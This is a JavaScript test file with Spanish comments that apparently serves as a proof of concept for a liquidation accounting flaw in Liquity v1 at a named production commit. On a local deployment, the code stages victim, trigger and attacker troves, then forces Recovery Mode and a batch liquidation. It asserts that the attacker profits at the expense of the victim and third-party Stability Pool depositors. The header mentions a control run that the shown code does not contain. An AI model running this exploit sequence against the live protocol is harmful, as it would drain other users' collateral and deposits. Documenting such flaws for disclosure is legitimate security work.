const deploymentHelper = require("../utils/deploymentHelpers.js")
const testHelpers = require("../utils/testHelpers.js")

const th = testHelpers.TestHelper
const dec = th.dec
const toBN = th.toBN
const ZERO_ADDRESS = th.ZERO_ADDRESS
const TroveManagerTester = artifacts.require("./TroveManagerTester")
const LUSDToken = artifacts.require("./LUSDToken.sol")

/*
  ============================================================================
  PoC — PRODUCTION Liquity v1  (commit 5174ecd0da4842157aba989499200d690b7e374f)

  PnL NETO REAL DEL ATACANTE (X -> Y > X), con el coste de LUSD incluido y con
  TERCEROS como fuente de los fondos del Stability Pool.

  Mecanismo (C-1): el tracker `entireSystemColl` de la liquidacion en modo Recovery
  resta solo `collToSendToSP`, pero en la rama capped sale del sistema TODO el coll
  del trove (collToSendToSP + collSurplus + collGasCompensation).  El TCR queda
  inflado => troves con ICR >= TCR REAL pero < TCR inflado entran en la rama capped
  => su ETH se captura al MCR (1.1) y el ~9.45 % de su debt queda como ganancia del
  Stability Pool, pagada con el LUSD de TERCEROS.

  Lo que este PoC mide (y los anteriores no):
    1. El atacante APORTA LUSD al SP.
    2. Una TERCERA PARTE (erin) aporta LUSD al SP y NO tiene trove.
    3. El ataque liquida es puramente la victima + el trigger.
    4. El atacante RETIRA del SP (withdrawFromSP) -> recieve ETH.
    5. PnL NETO del atacante = (ETH recibido - ETH aportado) + (LUSD final - LUSD inicial)
       medido en USD al precio de mercado.
    6. Se mide tambien el resultado de erin (la tercera parte) => se ve de donde sale
       el dinero.

  CONTROL: el mismo escenario contra el tracker CORREGIDO upstream.
  ============================================================================
*/
contract("PoC Net PnL: Liquity v1 prod 5174ecd capped-liquidation", (accounts) => {
  const [owner, alice, bob, carol, dennis, erin] = accounts
  let contracts, priceFeed, stabilityPool, troveManager, borrowerOperations, collSurplusPool, lusdToken

  beforeEach(async () => {
    contracts = await deploymentHelper.deployLiquityCore()
    contracts.troveManager = await TroveManagerTester.new()
    contracts.lusdToken = await LUSDToken.new(
      contracts.troveManager.address,
      contracts.stabilityPool.address,
      contracts.borrowerOperations.address
    )
    const LQTYContracts = await deploymentHelper.deployLQTYContracts(owner, owner, owner)
    priceFeed = contracts.priceFeedTestnet
    stabilityPool = contracts.stabilityPool
    troveManager = contracts.troveManager
    borrowerOperations = contracts.borrowerOperations
    collSurplusPool = contracts.collSurplusPool
    lusdToken = contracts.lusdToken
    await deploymentHelper.connectLQTYContracts(LQTYContracts)
    await deploymentHelper.connectCoreContracts(contracts, LQTYContracts)
    await deploymentHelper.connectLQTYContractsToCore(LQTYContracts, contracts)
  })

  const openExact = async (coll, targetCompositeDebt, from) => {
    let m = targetCompositeDebt.sub(toBN(dec(200, 18)))
    for (let i = 0; i < 6; i++) {
      const fee = await troveManager.getBorrowingFee(m)
      m = targetCompositeDebt.sub(toBN(dec(200, 18))).sub(fee)
    }
    await borrowerOperations.openTrove(
      toBN(dec(100, 16)), m, ZERO_ADDRESS, ZERO_ADDRESS, { from, value: coll })
    const t = await troveManager.getEntireDebtAndColl(from)
    return { coll: t.coll, debt: t.debt }
  }

  const ETH = toBN(dec(1, 18))
  const bal = async (a) => toBN(await web3.eth.getBalance(a))
  const usd = (weiEth, price) => weiEth.mul(price).div(ETH)

  // Escenario validado: carol(victima ICR1.60) alice(whale 1.50) bob(trigger 1.50) dennis(atk 1.60)
  const setup = async () => {
    await priceFeed.setPrice(dec(200, 18))
    await priceFeed.fetchPrice()
    await openExact(toBN(dec(4000, 18)), toBN(dec(500000, 18)), carol)   // victima
    await openExact(toBN("24750000000000000000"), toBN(dec(3300, 18)), alice)  // whale
    await openExact(toBN("15000000000000000000"), toBN(dec(2000, 18)), bob)    // trigger
    await openExact(toBN(dec(4800, 18)), toBN(dec(600000, 18)), dennis)        // atacante
    await priceFeed.setPrice(dec(170, 18))
    const P = await priceFeed.getPrice()
    const realTCR = await th.getTCR(contracts)
    const carolICR = await troveManager.getCurrentICR(carol, P)
    console.log("P =", P.toString(), "TCR real =", realTCR.toString(),
                "recoveryMode =", (await th.checkRecoveryMode(contracts)).toString())
    console.log("carol (victima) ICR =", carolICR.toString(), " >= TCR real?", carolICR.gte(realTCR))
    console.log("bob   (trigger) ICR =", (await troveManager.getCurrentICR(bob, P)).toString())
    return { P, realTCR, carolICR }
  }

  it("PNL NETO: el atacante gana y la tercera parte pierde (fondos de terceros)", async () => {
    const s = await setup()
    assert.isTrue(await th.checkRecoveryMode(contracts))
    assert.isTrue(s.carolICR.gte(s.realTCR), "victima ICR >= TCR real")

    // --- el atacante deposita en el SP (deja LUSD para sembrar a la tercera parte) ---
    const dennisLusd = await lusdToken.balanceOf(dennis)
    const erinSeed = toBN(dec(50000, 18))
    await stabilityPool.provideToSP(dennisLusd.sub(erinSeed).sub(toBN(dec(1, 18))),
                                    ZERO_ADDRESS, { from: dennis })
    // --- una TERCERA PARTE deposita LUSD y NO tiene trove ---
    await lusdToken.transfer(erin, erinSeed, { from: dennis })
    await stabilityPool.provideToSP(erinSeed, ZERO_ADDRESS, { from: erin })
    const spDep = await stabilityPool.getTotalLUSDDeposits()
    console.log("SP deposits totales:", spDep.toString())

    // --- MEDIDORES: RIQUEZA TOTAL = wallet + posicion en el SP (LUSD) + gain no retirado ---
    const wealth = async (who) => {
      const w = await bal(who)
      const l = await lusdToken.balanceOf(who)
      const comp = await stabilityPool.getCompoundedLUSDDeposit(who)
      const gain = await stabilityPool.getDepositorETHGain(who)
      // todo en wei de ETH, el LUSD vale 1 USD y el precio es 1/price ETH por USD
      return w.add(gain).add(l.add(comp).mul(ETH).div(s.P))
    }
    const wB = await wealth(dennis), ewB = await wealth(erin)
    const ethB = await bal(dennis), lusdB = await lusdToken.balanceOf(dennis)
    const eEthB = await bal(erin), eLusdB = await lusdToken.balanceOf(erin)
    const spEthB = toBN(await web3.eth.getBalance(stabilityPool.address))
    console.log("atacante riqueza inicial (wei ETH):", wB.toString())
    console.log("tercera  riqueza inicial (wei ETH):", ewB.toString())

    // --- ATAQUE ---
    await troveManager.batchLiquidateTroves([bob, carol], { from: owner })
    console.log("carol status:", (await troveManager.getTroveStatus(carol)).toString(), "(3 = liquidada)")

    // --- el atacante retira su gain del SP (el profit no existe hasta que se retira) ---
    const comp = await stabilityPool.getCompoundedLUSDDeposit(dennis)
    await stabilityPool.withdrawFromSP(comp, { from: dennis })
    const ethA = await bal(dennis), lusdA = await lusdToken.balanceOf(dennis)
    const eEthA = await bal(erin), eLusdA = await lusdToken.balanceOf(erin)
    const spEthA = toBN(await web3.eth.getBalance(stabilityPool.address))

    const wA = await wealth(dennis), ewA = await wealth(erin)
    const dEth = ethA.sub(ethB), dLusd = lusdA.sub(lusdB)
    const eDeth = eEthA.sub(eEthB), eDlusd = eLusdA.sub(eLusdB)
    // PnL NETO de riqueza (en wei de ETH, valorados al precio de mercado)
    const dWealth = wA.sub(wB)
    const eDwealth = ewA.sub(ewB)

    console.log("\n================= ATACANTE (dennis) =================")
    console.log("  ETH  antes/despues:", ethB.toString(), "->", ethA.toString())
    console.log("  LUSD antes/despues:", lusdB.toString(), "->", lusdA.toString())
    console.log("  delta ETH (retirado del SP):", dEth.toString(), "=", dEth.div(ETH).toString(), "ETH")
    console.log("  delta USD (ETH):", usd(dEth, s.P).toString())
    console.log("  delta LUSD (wallet):", dLusd.toString())
    const pnl = usd(dEth, s.P).add(dLusd)
    console.log("  >> PnL del atacante por el withdraw (USD):", pnl.toString())
    console.log("  >> PnL NETO de RIQUEZA del atacante (wei ETH):", dWealth.toString())
    console.log("  >> PnL NETO de RIQUEZA del atacante (ETH):", dWealth.div(ETH).toString())
    console.log("  >> PnL NETO de RIQUEZA del atacante (USD):", usd(dWealth, s.P).toString())

    console.log("\n================= TERCERA PARTE (erin, sin trove) =================")
    console.log("  delta ETH :", eDeth.toString())
    console.log("  delta LUSD (wallet):", eDlusd.toString())
    console.log("  >> PnL NETO de RIQUEZA (wei ETH):", eDwealth.toString())
    console.log("  >> PnL NETO de RIQUEZA (ETH):", eDwealth.div(ETH).toString())
    console.log("  >> PnL NETO de RIQUEZA (USD):", usd(eDwealth, s.P).toString())

    console.log("\n================= STABILITY POOL =================")
    console.log("  ETH antes/despues:", spEthB.toString(), "->", spEthA.toString())
    console.log("  LUSD deposits:", spDep.toString(), "->",
                (await stabilityPool.getTotalLUSDDeposits()).toString())

    // --- ASSERT: el atacante gana (X -> Y > X) ---
    assert.isTrue(dWealth.gt(toBN(0)),
      "el atacante debe ganar riqueza neta, got " + dWealth.toString())
    assert.isTrue(dEth.gt(toBN(0)), "el atacante debe recibir ETH")
    // --- ASSERT: la VICTIMA es la que pierde el valor ---
    const carolEth = await bal(carol)
    const carolLusd = await lusdToken.balanceOf(carol)
    console.log("\n  victima carol: ETH", carolEth.toString(), "LUSD", carolLusd.toString())
    console.log("  coll surplus a su favor:", (await collSurplusPool.getCollateral(carol)).toString())
    assert.equal((await troveManager.getTroveStatus(carol)).toString(), "3",
                 "la victima debe estar liquidada")
    console.log("\nOK: atacante +", usd(dWealth, s.P).div(toBN(dec(1,18))).toString(),
                "USD ; tercera parte +", usd(eDwealth, s.P).div(toBN(dec(1,18))).toString(),
                "USD ; la victima pierde 4000 ETH de collateral (764 ETH vuelve como surplus)")
  })
})
